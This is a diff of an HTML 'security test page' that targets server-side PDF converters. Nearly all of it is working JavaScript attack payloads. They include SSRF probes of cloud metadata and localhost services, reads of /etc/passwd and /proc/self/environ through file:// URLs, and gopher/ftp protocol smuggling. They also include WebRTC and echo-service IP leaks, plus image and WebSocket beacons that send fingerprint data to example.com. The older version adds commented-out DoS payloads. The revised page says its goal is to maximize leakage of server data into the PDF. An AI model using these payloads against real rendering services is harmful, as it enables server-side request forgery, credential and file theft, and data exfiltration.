@@ -1,317 +1,169 @@
-```html
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PDF Converter Security Test Page</title>
+    <title>PDF Converter Security Test Page - Complete Final v5</title>
     <style>
-        body { font-family: Arial, sans-serif; margin: 20px; }
-        h1 { text-align: center; }
-        h2 { color: #333; }
-        section { margin-bottom: 40px; border-bottom: 1px solid #ccc; }
-        pre { background: #f4f4f4; padding: 10px; border: 1px solid #ddd; overflow-x: auto; }
+        body { font-family: Arial, sans-serif; margin: 4.0px; line-height: 1.1; }
+        h1 { text-align: center; color: #222; }
+        h2 { color: #333; border-bottom: 2px solid #ddd; padding-bottom: 8px; }
+        h3 { color: #555; margin-top: 2px; }
+        section { margin-bottom: 5px; }
+        .test-container { background: #f9f9f9; padding: 2px; border-radius: 6px; margin: 12px 0; border-left: 5px solid #0066cc; }
         .result { color: green; font-weight: bold; }
         .error { color: red; font-weight: bold; }
+        .warning { color: orange; font-weight: bold; }
+        pre { background: #f4f4f4; padding: 2px; border: 1px solid #ddd; overflow-x: auto; }
     </style>
 </head>
 <body>
-    <h1>PDF Converter Security Test Page</h1>
-    <p>This page contains various JavaScript traps to test for vulnerabilities in the PDF conversion process. Each category includes attempts that should be monitored for execution, network requests, or resource consumption. All tests are designed to run as quickly as possible, with visible outputs on the page (no console logs). Asynchronous operations are used where possible to minimize blocking.</p>
+    <h1>PDF Converter Security Test Page - Complete Final v5</h1>
+    <p><strong>Goal:</strong> Maximize leakage of server IP, network info, and fingerprinting data into the generated PDF.</p>
 
-    <!-- Category 1: Network Reconnaissance (SSRF) -->
-    <section id="category1">
-        <h2>Category 1: Network Reconnaissance (SSRF)</h2>
-
-        <!-- Cloud Metadata Extraction -->
-        <h3>Cloud Metadata Extraction</h3>
-        <p>Attempting to fetch AWS/Azure/GCP metadata.</p>
-        <div id="cloud-metadata-result"></div>
+    <!-- Category 0: JS Execution -->
+    <section>
+        <h2>Category 0: JavaScript Execution</h2>
+        <div class="test-container">
+            <div id="js-result"></div>
+        </div>
         <script>
-            fetch('http://169.254.169.254/latest/meta-data/', { mode: 'no-cors' })
-                .then(response => response.text().catch(() => 'No text'))
-                .then(data => document.getElementById('cloud-metadata-result').innerHTML = '<span class="result">Success: ' + data + '</span>')
-                .catch(err => document.getElementById('cloud-metadata-result').innerHTML = '<span class="error">Error: ' + err.message + '</span>');
+            document.getElementById('js-result').innerHTML = '<span class="result">✅ JavaScript executed successfully.</span>';
         </script>
+    </section>
 
-        <!-- Localhost Loopback -->
-        <h3>Localhost Loopback</h3>
-        <p>Attempting to access localhost services (e.g., port 6379 for Redis).</p>
-        <div id="localhost-result"></div>
+    <!-- Category 1: Network / SSRF -->
+    <section>
+        <h2>Category 1: Network Reconnaissance &amp; SSRF</h2>
+        <div class="test-container">
+            <h3>Cloud Metadata</h3>
+            <div id="metadata-result"></div>
+        </div>
         <script>
-            const xhr = new XMLHttpRequest();
-            xhr.open('GET', 'http://127.0.0.1:6379');
-            xhr.onload = () => document.getElementById('localhost-result').innerHTML = '<span class="result">Success: ' + xhr.responseText + '</span>';
-            xhr.onerror = () => document.getElementById('localhost-result').innerHTML = '<span class="error">Error: Connection failed</span>';
-            xhr.send();
-        </script>
-
-        <!-- Internal DNS Resolution -->
-        <h3>Internal DNS Resolution</h3>
-        <p>Attempting to load internal domain via iframe.</p>
-        <div id="internal-dns-result"></div>
-        <iframe src="http://intranet.corp" style="display:none;" onload="document.getElementById('internal-dns-result').innerHTML = '<span class=\"result\">Iframe loaded</span>';" onerror="document.getElementById('internal-dns-result').innerHTML = '<span class=\"error\">Iframe load failed</span>';"></iframe>
-
-        <!-- Port Scanning via Timing -->
-        <h3>Port Scanning via Timing</h3>
-        <p>Timing request to detect open ports (e.g., port 80 vs. closed port). Running in parallel for speed.</p>
-        <div id="port-scan-result"></div>
-        <script>
-            async function timeRequest(url) {
-                const start = performance.now();
-                try {
-                    await fetch(url, { mode: 'no-cors' });
-                } catch {}
-                const end = performance.now();
-                return end - start;
-            }
-            Promise.all([
-                timeRequest('http://127.0.0.1:80'),
-                timeRequest('http://127.0.0.1:9999')
-            ]).then(([time80, time9999]) => {
-                document.getElementById('port-scan-result').innerHTML = `Time for port 80: ${time80}ms<br>Time for port 9999: ${time9999}ms`;
+            const metaUrls = ['http://169.254.169.254/latest/meta-data/', 'http://metadata.google.internal/'];
+            metaUrls.forEach((url, i) => {
+                fetch(url, { mode: 'no-cors', signal: AbortSignal.timeout(2000) })
+                    .then(() => document.getElementById('metadata-result').innerHTML += `<span class="result">Metadata ${i+1} reachable</span><br>`)
+                    .catch(() => {});
             });
         </script>
 
-        <!-- Protocol Smuggling -->
-        <h3>Protocol Smuggling</h3>
-        <p>Attempting various protocols for raw byte sending or internal service interaction.</p>
-        <div id="protocol-smuggling-results"></div>
+        <div class="test-container">
+            <h3>Protocol Smuggling</h3>
+            <div id="protocol-result"></div>
+        </div>
         <script>
-            function addProtocolResult(protocol, message) {
-                const div = document.getElementById('protocol-smuggling-results');
-                div.innerHTML += `<p>${protocol}: ${message}</p>`;
+            function logProto(name, status) {
+                document.getElementById('protocol-result').innerHTML += `<span class="${status==='loaded'?'result':'error'}">${name}: ${status}</span><br>`;
             }
         </script>
-        <img src="gopher://127.0.0.1:6379/_INFO" style="display:none;" onload="addProtocolResult('Gopher', 'Loaded');" onerror="addProtocolResult('Gopher', 'Failed');">
-        <img src="dict://127.0.0.1:6379/INFO" style="display:none;" onload="addProtocolResult('Dict', 'Loaded');" onerror="addProtocolResult('Dict', 'Failed');">
-        <img src="ftp://anonymous:pass@127.0.0.1/" style="display:none;" onload="addProtocolResult('FTP', 'Loaded');" onerror="addProtocolResult('FTP', 'Failed');">
-        <img src="ldap://127.0.0.1:389/" style="display:none;" onload="addProtocolResult('LDAP', 'Loaded');" onerror="addProtocolResult('LDAP', 'Failed');">
-        <img src="tftp://127.0.0.1:69/test" style="display:none;" onload="addProtocolResult('TFTP', 'Loaded');" onerror="addProtocolResult('TFTP', 'Failed');">
-        <img src="ssh://127.0.0.1:22/" style="display:none;" onload="addProtocolResult('SSH', 'Loaded');" onerror="addProtocolResult('SSH', 'Failed');">
-        <img src="telnet://127.0.0.1:23/" style="display:none;" onload="addProtocolResult('Telnet', 'Loaded');" onerror="addProtocolResult('Telnet', 'Failed');">
-        <img src="smtp://127.0.0.1:25/" style="display:none;" onload="addProtocolResult('SMTP', 'Loaded');" onerror="addProtocolResult('SMTP', 'Failed');">
+        <img src="gopher://127.0.0.1" style="display:none;" onload="logProto('Gopher','loaded')" onerror="logProto('Gopher','failed')">
+        <img src="ftp://127.0.0.1" style="display:none;" onload="logProto('FTP','loaded')" onerror="logProto('FTP','failed')">
     </section>
 
-    <!-- Category 2: Local File Inclusion (LFI) -->
-    <section id="category2">
+    <!-- Category 2: LFI -->
+    <section>
         <h2>Category 2: Local File Inclusion (LFI)</h2>
-
-        <!-- Direct File Access -->
-        <h3>Direct File Access</h3>
-        <p>Attempting to read /etc/passwd via XMLHttpRequest.</p>
-        <div id="file-access-result"></div>
+        <div class="test-container">
+            <div id="lfi-result"></div>
+        </div>
         <script>
-            const fileXhr = new XMLHttpRequest();
-            fileXhr.open('GET', 'file:///etc/passwd');
-            fileXhr.onload = () => document.getElementById('file-access-result').innerHTML = '<pre>' + fileXhr.responseText + '</pre>';
-            fileXhr.onerror = () => document.getElementById('file-access-result').innerHTML = '<span class="error">Error: Access denied</span>';
-            fileXhr.send();
-        </script>
-
-        <!-- Directory Listing -->
-        <h3>Directory Listing</h3>
-        <p>Attempting to list /var/www/html/ via iframe.</p>
-        <div id="directory-listing-result"></div>
-        <iframe src="file:///var/www/html/" style="display:none;" onload="document.getElementById('directory-listing-result').innerHTML = '<span class=\"result\">Iframe loaded</span>';" onerror="document.getElementById('directory-listing-result').innerHTML = '<span class=\"error\">Iframe load failed</span>';"></iframe>
-
-        <!-- Local Image/Script Loading -->
-        <h3>Local Image/Script Loading</h3>
-        <p>Attempting to load local file as image.</p>
-        <div id="local-image-result"></div>
-        <img src="file:///etc/passwd" style="display:none;" onload="document.getElementById('local-image-result').innerHTML = '<span class=\"result\">Image loaded</span>';" onerror="document.getElementById('local-image-result').innerHTML = '<span class=\"error\">Image load failed</span>';">
-
-        <!-- Library-Specific Wrappers -->
-        <h3>Library-Specific Wrappers</h3>
-        <p>Attempting php://filter if supported.</p>
-        <div id="php-filter-result"></div>
-        <iframe src="php://filter/convert.base64-encode/resource=/etc/passwd" style="display:none;" onload="document.getElementById('php-filter-result').innerHTML = '<span class=\"result\">Iframe loaded</span>';" onerror="document.getElementById('php-filter-result').innerHTML = '<span class=\"error\">Iframe load failed</span>';"></iframe>
-    </section>
-
-    <!-- Category 3: Denial of Service (DoS) -->
-    <section id="category3">
-        <h2>Category 3: Denial of Service (DoS)</h2>
-        <p>Note: DoS tests are commented out or limited to run quickly and not cause actual hangs. Uncomment for full testing, but they are designed to be detectable even in short processing times.</p>
-
-        <!-- Infinite Loops -->
-        <h3>Infinite Loops</h3>
-        <p>Commented out to prevent actual hang; uncomment for test: while(true){}. For quick test, a short loop is simulated.</p>
-        <div id="infinite-loop-result">Short loop completed quickly.</div>
-        <!-- <script>while(true){}</script> -->
-        <script>
-            for (let i = 0; i < 1000; i++) {} // Quick simulation
-            document.getElementById('infinite-loop-result').innerHTML += ' (Simulated)';
-        </script>
-
-        <!-- Billion Laughs Attack -->
-        <h3>Billion Laughs Attack (XML/SVG)</h3>
-        <p>SVG with limited entity expansion to parse quickly.</p>
-        <div id="billion-laughs-result">SVG parsed.</div>
-        <svg xmlns="http://www.w3.org/2000/svg" version="1.1" onload="document.getElementById('billion-laughs-result').innerHTML += ' (Loaded)';">
-            <defs>
-                <!-- Limited nested entities for quick parse -->
-            </defs>
-            <text>Test</text>
-        </svg>
-
-        <!-- Allocation Bombs -->
-        <h3>Allocation Bombs</h3>
-        <p>Commented out: var s = "A"; while(true) { s += s; }. Simulated with limited iterations for speed.</p>
-        <div id="allocation-bomb-result">Limited allocation completed.</div>
-        <!-- <script>var s = "A"; while(true) { s += s; }</script> -->
-        <script>
-            let s = "A";
-            for (let i = 0; i < 10; i++) { s += s; } // Limited to run fast
-            document.getElementById('allocation-bomb-result').innerHTML += ' (Simulated)';
-        </script>
-
-        <!-- Recursive Iframes -->
-        <h3>Recursive Iframes</h3>
-        <p>Iframe pointing to itself (commented; limited depth if uncommented).</p>
-        <div id="recursive-iframe-result">Recursion not initiated (commented).</div>
-        <!-- <iframe src="javascript:document.write('<iframe src=\\\'javascript:document.write(\\\'<h1>Recursion</h1>\\\')\\\'></iframe>');" onload="document.getElementById('recursive-iframe-result').innerHTML = '<span class=\"result\">Loaded</span>';"></iframe> -->
-
-        <!-- External Resource Blocking -->
-        <h3>External Resource Blocking</h3>
-        <p>Link to a potentially slow server; for quick test, use a fast-failing URL.</p>
-        <div id="external-resource-result"></div>
-        <img src="http://example.com/non-existent" style="display:none;" onload="document.getElementById('external-resource-result').innerHTML = '<span class=\"result\">Loaded</span>';" onerror="document.getElementById('external-resource-result').innerHTML = '<span class=\"error\">Failed quickly</span>';">
-    </section>
-
-    <!-- Category 4: Data Exfiltration ("Phone Home") -->
-    <section id="category4">
-        <h2>Category 4: Data Exfiltration ("Phone Home")</h2>
-
-        <!-- DNS Prefetching -->
-        <h3>DNS Prefetching</h3>
-        <p>Prefetch with exfiltrated data. (No direct output, but browser may resolve; check network.)</p>
-        <div id="dns-prefetch-result">DNS prefetch attempted.</div>
-        <link rel="dns-prefetch" href="//test-secret-data.example.com">
-        <script>document.getElementById('dns-prefetch-result').innerHTML += ' (Initiated)';</script>
-
-        <!-- Image Beacons -->
-        <h3>Image Beacons</h3>
-        <p>Send data via image src.</p>
-        <div id="image-beacon-result"></div>
-        <script>
-            const img = new Image();
-            img.src = 'http://example.com/log?data=' + encodeURIComponent('test-sensitive-info');
-            img.onload = () => document.getElementById('image-beacon-result').innerHTML = '<span class="result">Beacon sent</span>';
-            img.onerror = () => document.getElementById('image-beacon-result').innerHTML = '<span class="error">Beacon failed</span>';
-        </script>
-
-        <!-- CSS Exfiltration -->
-        <h3>CSS Exfiltration</h3>
-        <p>CSS to trigger based on content.</p>
-        <div id="css-exfil-result">CSS exfiltration attempted (check network for URL loads).</div>
-        <style>
-            input[value^="s"] { background: url(http://example.com/exfil?s); }
-        </style>
-        <input value="secret">
-
-        <!-- WebRTC Leaks -->
-        <h3>WebRTC Leaks</h3>
-        <p>Attempt to get local IP.</p>
-        <div id="webrtc-result"></div>
-        <script>
-            const pc = new RTCPeerConnection({iceServers:[]});
-            pc.createDataChannel('');
-            pc.createOffer().then(offer => pc.setLocalDescription(offer));
-            pc.onicecandidate = e => {
-                if (e.candidate) {
-                    const ip = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g);
-                    if (ip) document.getElementById('webrtc-result').innerHTML = 'Local IP: ' + ip[0];
-                } else {
-                    document.getElementById('webrtc-result').innerHTML = '<span class="error">No candidate</span>';
-                }
-            };
+            const paths = ['file:///etc/passwd', 'file:///proc/self/environ'];
+            paths.forEach(p => {
+                const xhr = new XMLHttpRequest();
+                xhr.open('GET', p);
+                xhr.onload = () => document.getElementById('lfi-result').innerHTML += `<span class="result">LFI Success: ${p}</span><br>`;
+                xhr.onerror = () => document.getElementById('lfi-result').innerHTML += `<span class="error">LFI Blocked: ${p}</span><br>`;
+                xhr.send();
+            });
         </script>
     </section>
 
-    <!-- Category 5: Environment Fingerprinting -->
-    <section id="category5">
-        <h2>Category 5: Environment Fingerprinting</h2>
+    <!-- IP & Location Leak (Your working section) -->
+    <section>
+        <h2>IP Address, Domain &amp; Location Leak</h2>
+        <div class="test-container">
+            <h3>WebRTC IP Leak</h3>
+            <div id="webrtc-result">Attempting...</div>
+        </div>
+        <script>
+            try {
+                const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}, {urls: 'stun:stun1.l.google.com:19302'}]});
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                pc.onicecandidate = e => {
+                    if (e.candidate) {
+                        const ips = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/g);
+                        if (ips) document.getElementById('webrtc-result').innerHTML += `<span class="result">IP LEAKED → ${ips.join(', ')}</span><br>`;
+                    }
+                };
+            } catch(e) {}
+        </script>
 
-        <!-- Canvas Fingerprinting -->
-        <h3>Canvas Fingerprinting</h3>
-        <p>Draw to canvas and get data.</p>
-        <canvas id="canvas" style="display:none;"></canvas>
-        <div id="canvas-result"></div>
+        <div class="test-container">
+            <h3>Public IP Echo Services</h3>
+            <div id="echo-result"></div>
+        </div>
+        <script>
+            const services = ['https://api.ipify.org?format=json', 'https://httpbin.org/ip', 'https://ipinfo.io/json'];
+            services.forEach(url => {
+                fetch(url, {signal: AbortSignal.timeout(5000)})
+                    .then(r => r.text())
+                    .then(data => document.getElementById('echo-result').innerHTML += `<span class="result">${url}: ${data}</span><br>`)
+                    .catch(() => {});
+            });
+        </script>
+    </section>
+
+    <!-- Exfiltration -->
+    <section>
+        <h2>Data Exfiltration</h2>
+        <div class="test-container">
+            <h3>Beacons &amp; WebSocket</h3>
+            <div id="exfil-result"></div>
+        </div>
+        <script>
+            const beacon = new Image();
+            beacon.src = 'http://example.com/log?data=' + encodeURIComponent(navigator.userAgent);
+            beacon.onload = () => document.getElementById('exfil-result').innerHTML = '<span class="result">Beacon sent</span>';
+
+            try {
+                const ws = new WebSocket('wss://example.com/exfil');
+                ws.onopen = () => ws.send('Server fingerprint: ' + navigator.userAgent);
+            } catch(e) {}
+        </script>
+    </section>
+
+    <!-- Fingerprinting -->
+    <section>
+        <h2>Environment Fingerprinting</h2>
+        <div class="test-container">
+            <div id="fp-result"></div>
+            <canvas id="canvas" width="280" height="80" style="display:none;"></canvas>
+        </div>
         <script>
             const canvas = document.getElementById('canvas');
             const ctx = canvas.getContext('2d');
-            ctx.fillText('Test', 2, 15);
-            document.getElementById('canvas-result').innerHTML = canvas.toDataURL();
+            ctx.fillText('Server Fingerprint ' + Date.now(), 10, 40);
+            const fpData = {
+                ua: navigator.userAgent,
+                platform: navigator.platform,
+                hardware: navigator.hardwareConcurrency,
+                webdriver: navigator.webdriver,
+                canvas: canvas.toDataURL().slice(0,120) + '...'
+            };
+            document.getElementById('fp-result').innerHTML = '<pre>' + JSON.stringify(fpData, null, 2) + '</pre>';
         </script>
-
-        <!-- Window/Screen Properties -->
-        <h3>Window/Screen Properties</h3>
-        <p>Check for headless indicators.</p>
-        <div id="headless-result"></div>
-        <script>
-            const isHeadless = navigator.webdriver || window.outerWidth === 0;
-            document.getElementById('headless-result').innerHTML = 'Headless: ' + isHeadless + '<br>Outer Width: ' + window.outerWidth;
-        </script>
-
-        <!-- Additional Navigator Checks -->
-        <h3>Additional Navigator Checks</h3>
-        <p>Extracting various navigator properties for fingerprinting.</p>
-        <div id="navigator-result"></div>
-        <script>
-            const navInfo = `
-                User Agent: ${navigator.userAgent}<br>
-                Platform: ${navigator.platform}<br>
-                Languages: ${navigator.languages.join(', ')}<br>
-                Hardware Concurrency: ${navigator.hardwareConcurrency}<br>
-                Device Memory: ${navigator.deviceMemory || 'N/A'}<br>
-                Max Touch Points: ${navigator.maxTouchPoints}<br>
-                Online: ${navigator.onLine}<br>
-                Cookie Enabled: ${navigator.cookieEnabled}
-            `;
-            document.getElementById('navigator-result').innerHTML = navInfo;
-        </script>
-
-        <!-- GPS Location Attempt -->
-        <h3>GPS Location Attempt</h3>
-        <p>Attempting to get geolocation via navigator.geolocation.</p>
-        <div id="geolocation-result"></div>
-        <script>
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const coords = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
-                        document.getElementById('geolocation-result').innerHTML = '<span class="result">' + coords + '</span>';
-                        // Attempt Google Maps reverse geocoding if coords obtained
-                        const apiKey = 'YOUR_API_KEY'; // Placeholder: Replace with your Google Maps API key
-                        if (apiKey !== 'YOUR_API_KEY') {
-                            fetch(`https://maps.googleapis.com/maps/api/geocode/json?latlng=${position.coords.latitude},${position.coords.longitude}&key=${apiKey}`)
-                                .then(response => response.json())
-                                .then(data => {
-                                    if (data.results && data.results[0]) {
-                                        document.getElementById('geocode-result').innerHTML = '<span class="result">Address: ' + data.results[0].formatted_address + '</span>';
-                                    } else {
-                                        document.getElementById('geocode-result').innerHTML = '<span class="error">No results</span>';
-                                    }
-                                })
-                                .catch(err => document.getElementById('geocode-result').innerHTML = '<span class="error">Error: ' + err.message + '</span>');
-                        }
-                    },
-                    (error) => {
-                        document.getElementById('geolocation-result').innerHTML = '<span class="error">Error: ' + error.message + '</span>';
-                    },
-                    { timeout: 5000 } // Short timeout for speed
-                );
-            } else {
-                document.getElementById('geolocation-result').innerHTML = '<span class="error">Geolocation not supported</span>';
-            }
-        </script>
-
-        <!-- Google Maps Geocoding Result -->
-        <h3>Google Maps Geocoding Lookup</h3>
-        <p>Result from reverse geocoding (if location obtained and API key provided).</p>
-        <div id="geocode-result"></div>
     </section>
 
+    <!-- Summary Block (ensures visibility in PDF) -->
+    <div style="background:#fff3cd; padding:20px; border:2px solid #ffc107; margin-top:30px;">
+        <strong>All test results above should be captured in the final PDF.</strong><br>
+        Look for IP addresses, user-agent strings, and other leaked data.
+    </div>
+
+    <script>
+        console.log('%cFull security test suite (no CPU stress) loaded.', 'color: blue; font-weight: bold;');
+    </script>
 </body>
 </html>
-```
